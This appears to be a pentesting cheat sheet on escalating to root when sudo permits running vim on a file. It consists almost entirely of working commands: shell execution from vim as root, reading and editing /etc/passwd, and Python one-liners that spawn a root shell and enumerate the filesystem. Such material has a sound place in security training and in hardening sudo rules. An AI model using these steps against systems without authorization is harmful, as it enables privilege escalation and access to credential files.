## Investigation

```sh
sudo -l

(ALL) NOPASSWD: vim example.txt
```

If we can execute **"vim"** command as root, we can execute the shell command in the vim editor.

<br />

## Exploitation

Simply run **"vim"** command as root.

```sh
sudo vim example.txt
```

In Vim editor, we can run shell commands as root.

```sh
:r!whoami
```

### Options

```sh
# Read environment variables
# - We can list them by entering [tab] key after `:echo $`.
:echo $PATH

# Read another file
:read /etc/passwd

# Edit another file
:edit /etc/passwd

# Execute Python script
:py import os;os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
:py3 import os;os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
# Enumeration
:py3 import os;print(os.listdir("/"))
# Write file from another file
:py3 open("/tmp/new_file", "wb").write(open("/tmp/original_file", "rb").read())
```
